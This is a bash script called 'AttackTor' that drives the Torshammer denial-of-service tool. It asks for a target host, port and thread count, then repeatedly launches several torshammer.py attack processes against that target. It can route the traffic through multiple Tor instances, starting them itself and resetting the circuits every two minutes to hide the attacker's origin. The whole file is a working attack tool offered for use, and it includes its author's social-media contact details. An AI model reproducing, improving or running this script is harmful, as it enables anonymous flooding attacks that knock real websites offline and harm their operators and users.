#!/usr/bin/bash
# AttackTor: DDoS Tool Beta v1.4 using Torshammer
# Coded by: The Sixty Nine
# Github: https://github.com/thesixtynine/Tor.git
# Facebook: akun.official.016
# Instagram: @dey_016
# WhatsApp: https://api.whatsapp.com/send?phone=6285775433901

clear

trap 'printf "\n";stop;exit 1' 2

checkroot() {

if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Please, run this program as root!\n\e[0m"
   exit 1
fi

}

changeip() {

killall -HUP tor

}

banner() {

printf "\n"
printf "\e[1;35m ▄▄▄▄▄▄▄▄     \e[1;92m█▀\e[0m\n"
printf "\e[1;35m ▀▀▀██▀▀▀   ▄████▄    ██▄████ \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
printf "\e[1;35m    ██     ██▀\e[1;47\e[0m██\e[1;95m▀██   ██▀     \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█▀▀\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ██     ██\e[1;47\e[0m████\e[1;95m██   ██      \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░░\e[1;91m█\e[0m\e[1;77m░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█▀▄\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
printf "\n"
printf "\e[100m:    TorAttacker Beta v1.4, Coded by: @thesixtynine     :\e[0m\n"
printf "\n"

}

config() {

default_portt="80"
default_threads="600"
default_tor="y"

read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Target: \e[0m\e[93m' target

read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Port \e[0m\e[77m(Default 80): \e[93m' portt
portt="${portt:-${default_portt}}"

read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Threads: \e[0m\e[77m(Default 600): \e[93m' threads
threads="${threads:-${default_threads}}"

read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Terminals \e[0m\e[77m(Default 4): \e[93m' inst
inst="${inst:-${default_inst}}"

read -e -p $'\e[92m[\e[0m\e[77m?\e[0m\e[92m] Anonymized Via \e[0m\e[105m TOR \e[0m\e[77m (start tor before) \e[0m\e[95m[Y/N]: \e[93m' tor
printf "\e[0m"
tor="${tor:-${default_tor}}"

if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[1;91m[\e[0m\e[1;77m^\e[1;91] Press Ctrl + C to stop attack \e[0m \n"
attacktor

else
attack
fi

}

readinst() {

default_inst="3"

read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Tor Instances \e[0m\e[77m(default: 3): \e[93m' inst
inst="${inst:-${default_inst}}"
multitor

}

attacktor() {

#let i=1
while true; do
  let ii=1
  while [ $ii -le $inst ]; do
porttor=$((9050+$ii))
#printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
ii=$((ii+1))
done
sleep 120
changeip
let i=1
let porttor=$((9050+$i))
done

}

attack() {

default_inst="4"
read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Terminals \e[0m\e[77m(Default 4): \e[93m' inst
inst="${inst:-${default_inst}}"
printf "\e[1;91m[\e[0m\e[77m*\e[91m] Press Ctrl + C to stop attack \e[0m \n"
i=1
while true; do
  let i=1
  while [[ $i -le $inst ]]; do

gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
i=$((i+1))
done
sleep 120
killall python
done

}

checktor() {

let i=1
checkcount=0

while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "\e[96m[\e[0m\e[77m#\e[0m\e[96m] Checking Tor connection on port:\e[0m\e[77m %s\e[0m..." $port
check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[91mFailed!\e[0m\n"

else
printf "\e[1;94mOk!\e[0m\n"
let checkcount++
fi
i=$((i+1))
done

if [[ $checkcount != $inst ]]; then
printf "\e[1;94m[\e[0m\e[1;77m-\e[1;94m] It Requires All Tor Running!\e[0m\n"
printf "\e[1;97m(1) Check Again\e[0m\n"
printf "\e[1;97m(2) Restart\n\e[0m"
printf "\e[1;97m(3) Exit\n\e[0m"

read -p $'\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Choose an option: \e[0m' fail

if [[ $fail == "1" ]]; then
checktor

elif [[ $fail == "2" ]]; then
stop
multitor

elif [[ $fail == "3" ]]; then
echo
printf "\e[1;91m[\e[0m\e[1;77m!\e[1;91m] Exit The Programm!\e[0m\n"
echo
sleep 1
exit

else
echo
printf "\e[1;92m[\e[0m\e[1;77m!\e[1;92m] Invalid Option!\e[0m\n"
echo
sleep 1
clear
banner
config
fi
fi

}

multitor() {

if [[ ! -d multitor ]]; then
mkdir multitor;
fi
default_ins="1"
inst="${inst:-${default_inst}}"
let i=1

while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i.
printf "\e[95m[\e[0m\e[77m*\e[0m\e[95m] Starting Tor On Port:\e[0m\e[1;77m 905%s\e[0m\n" $i.
tor -f multitor/multitor$i > /dev/null &
sleep 10
i=$((i+1))
done
checktor

}

stop() {

killall -2 tor > /dev/null 2>&1
printf "\e[1;91m[\e[0m\e[1;77mx\e[1;91m] All Tor Connection Stopped.\e[0m\n"

}

banner
checkroot
config
